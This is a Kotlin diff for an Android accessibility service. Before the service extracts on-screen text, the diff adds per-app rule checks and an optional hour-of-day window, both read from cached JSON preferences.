@@ -14,6 +14,34 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
+        val pkgName = event.packageName?.toString() ?: return
+        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        
+        // --- GATEKEEPER LOGIC ---
+        // Check if this app is in our allowed list
+        val rulesStr = prefs.getString("cached_rules", "{}")
+        // Note: For extreme performance, parsing should be cached in a variable, 
+        // but Android kills services often, so safe parsing is robust.
+        val rules = try { org.json.JSONObject(rulesStr) } catch (e: Exception) { org.json.JSONObject() }
+        
+        if (!rules.has(pkgName)) {
+            // Rule mismatch: Optimization - Ignore this app completely to save CPU
+            return
+        }
+
+        // Check Strategy
+        val rule = rules.getJSONObject(pkgName)
+        val strategy = rule.optString("strategy", "ALWAYS")
+        
+        if (strategy == "TIME_WINDOW") {
+            val params = rule.optJSONObject("params")
+            val start = params?.optInt("start", 0) ?: 0
+            val end = params?.optInt("end", 24) ?: 24
+            val currentHour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
+            if (currentHour < start || currentHour >= end) return
+        }
+        
+        // If we passed the checks, proceed to heavy lifting
         val source = event.source ?: return
         val textContent = StringBuilder()
         extractText(source, textContent)
